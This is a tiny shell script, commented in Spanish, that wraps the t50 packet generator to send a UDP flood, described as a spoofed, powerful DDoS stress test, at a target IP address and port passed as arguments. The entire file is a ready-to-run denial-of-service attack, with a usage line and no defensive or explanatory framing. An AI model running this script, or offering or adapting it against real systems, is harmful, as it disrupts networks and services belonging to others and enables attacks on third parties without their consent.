#!/bin/sh
echo
echo "Script spoof y potente test de stress DDoS UDP Flood"
echo "Uso.: ./t50spoof.sh IP_OBJETIVO PUERTO_UDP"
t50 $1 --dport $2 --flood --turbo -protocol UDP
